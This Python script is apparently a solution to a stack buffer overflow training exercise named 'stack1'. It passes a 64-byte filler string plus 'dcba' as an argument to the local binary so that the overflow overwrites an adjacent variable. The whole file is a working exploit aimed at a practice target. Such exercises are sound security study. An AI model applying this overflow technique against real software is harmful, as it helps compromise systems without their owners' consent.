#!/usr/bin/python

from subprocess import Popen
from subprocess import PIPE
import os                                                                                        # os.path.join(), os.getcwd()

BINARY_NAME = "stack1"


def main():
    # LOCAL VARIABLES
    currEnv = os.environ.copy()
    absBinFilename = os.path.join(os.getcwd(), BINARY_NAME)
    payload = ("HarkRulz" * 8) + "dcba"
    commandList = []

    # VERIFY FILE    
    if not os.path.isfile(absBinFilename):
        raise IOError("{} not found".format(absBinFilename))

    # RUN IT
    commandList.append(absBinFilename)
    commandList.append(payload)
    binary = Popen(commandList, env = currEnv, stdin = PIPE)
    if binary is not None:
        binary.communicate()

    # DONE
    return


if __name__ == "__main__":
    try:
        main()
    except Exception as err:
        print(repr(err))
